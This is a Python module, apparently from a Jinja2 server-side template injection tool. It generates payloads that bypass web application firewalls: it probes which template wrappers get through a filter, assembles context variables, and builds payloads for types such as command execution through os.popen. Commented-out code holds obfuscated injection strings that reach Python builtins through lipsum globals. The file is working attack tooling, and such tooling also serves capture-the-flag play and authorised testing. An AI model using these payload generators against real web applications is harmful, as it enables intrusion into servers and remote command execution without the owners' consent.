from typing import Callable, List, Tuple, Union, Dict, Any
import logging

from . import payload_gen
from .colorize import colored
from .context_vars import context_vars_all, filter_by_used_context, filter_by_waf
from .const import *

logger = logging.getLogger("shell_payload")


# def get_int_context(waf_func):
#     ints, var_names, payloads = get_passed_int_vars(waf_func)
#     print(ints, var_names, payloads)
#     if len(ints) == 0:
#         logger.warning("No IntVars For YOU!")
#     return dict(zip(var_names, payloads)), dict(zip(var_names, ints))


# def get_str_context(waf_func):
#     str_vars = [
#         ("un", "_", "{%set un=((({}|select()|trim|list)[24]))%}"),
#         ("perc", "%", "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2" +
#          "+dict(globals=x)|join+((({}|select()|trim|list)[24]))*2]" +
#          "[((({}|select()|trim|list)[24]))*2+dict(builtins=x)" +
#          "|join+((({}|select()|trim|list)[24]))*2][dict(chr=x)|join](37))%}"),
#         # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
#     ]
#     str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
#     return {var_name: payload for var_name, _, payload in str_vars}, {var_name: var_value for var_name, var_value, _ in str_vars}


def get_outer_pattern(waf_func):
    outer_payloads = [
        ("{{}}", "{{PAYLOAD}}", True),
        ("{%print()%}", "{%print(PAYLOAD)%}", True),
        ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
        ("{% set x= %}", "{% set x=PAYLOAD %}", False),
    ]
    for test_payload, outer_pattern, will_print in outer_payloads:
        if waf_func(test_payload):
            return outer_pattern, will_print
    else:
        logger.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
        return None, None

def context_payloads_to_context(context_payload: Dict[str, Dict[str, Any]]) -> Dict[str, Any]:
    """将context_payload转换成context字典。

    Args:
        context_payload (Dict[str, Dict[str, Any]]): 一个存储着payload以及对应上下文的字典

    Returns:
        Dict[str, Any]: 一个字典，键是变量名，值是变量值
    """
    return {var_name: var_value for _, d in context_payload.items() for var_name, var_value in d.items()}


class FullPayloadGen:
    """接受一个waf函数并负责生成payload
    waf函数接受一个字符串并返回这个字符串是否可以通过WAF
    payload由两部分组成：
        - 前方提供变量等上下文的上下文payload（一般为{%set xxx=xxx%}的形式）
        - 以及后方实际发挥作用的作用payload（一般被双花括号{{}}包裹）
    """
    def __init__(self, waf_func: Callable[[str, ], bool], callback: Union[Callable[[str, Dict], None], None] = None):
        self.waf_func = waf_func
        self.prepared = False
        self._callback: Callable[[str, Dict], None] = callback if callback else (lambda x, y: None)

    @property
    def callback(self):
        return self._callback
    
    @callback.setter
    def callback(self, callback):
        self._callback = callback
        if self.payload_gen:
            self.payload_gen.callback = callback

    def do_prepare(self) -> bool:
        """准备作用payload的最外层（一般为双花括号{{}}），过滤所有可用的payload

        Returns:
            bool: 是否生成成功，失败则无法生成payload。
        """
        if self.prepared:
            return True

        self.context_payload = filter_by_waf(context_vars_all, self.waf_func)

        self.context = context_payloads_to_context(self.context_payload)

        self.outer_pattern, self.will_print = get_outer_pattern(self.waf_func)
        if not self.outer_pattern:
            return False
        if self.will_print:
            logger.info(f"use {colored('blue', self.outer_pattern)}")
        else:
            logger.warning(
                f"use {colored('blue', self.outer_pattern)}, which {colored('red', 'will not print')} your result!")

        self.payload_gen = payload_gen.PayloadGenerator(self.waf_func, self.context, self.callback)
        self.prepared = True
        self.callback(CALLBACK_PREPARE_FULLPAYLOADGEN, {
            "context": self.context,
            "outer_pattern": self.outer_pattern,
            "will_print": self.will_print,
        })
        return True

    def add_context_variable(self, payload: str, context_vars: Dict[str, Any], check_waf: bool = True) -> bool:
        """将提供上下文变量以及对应payload加入payload生成器中，需要先调用.do_prepare函数

        Args:
            payload (str): 上下文变量对应的payload
            context_vars (Dict[str, Any]): 所有上下文变量，键是变量名，值是变量值
            check_waf (bool, optional): 是否使用waf函数检查传入的payload. Defaults to True.

        Raises:
            Exception: 需要先调用.do_prepare函数，否则抛出exception

        Returns:
            bool: 是否通过waf函数，不检查waf则永远为True
        """
        if not self.prepared:
            raise Exception("Please run .do_prepare() first")
        if check_waf and self.waf_func(payload):
            return False
        self.context_payload[payload] = context_vars
        self.context = context_payloads_to_context(self.context_payload)
        return True

    def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
        """根据要求生成payload

        Args:
            gen_type (str): 生成payload的类型，应传入如OS_POPEN_READ等在const.py中定义的类型

        Returns:
            Tuple[Union[str, None], Union[bool, None]]: payload, 以及payload是否会有回显
        """
        if not self.prepared and not self.do_prepare():
            return None, None

        ret = self.payload_gen.generate_with_used_context(gen_type, *args)

        if ret is None:
            logger.warning("Bypassing WAF Failed.")
            return None, None
        inner_payload, used_context = ret
        context_payload = "".join(filter_by_used_context(self.context_payload, used_context).keys())
        assert isinstance(self.outer_pattern, str)

        payload = context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)

        self.callback(CALLBACK_GENERATE_FULLPAYLOAD, {
            "gen_type": gen_type,
            "args": args,
            "payload": payload,
            "will_print": self.will_print,
        })

        return (
            payload, 
            self.will_print
        )


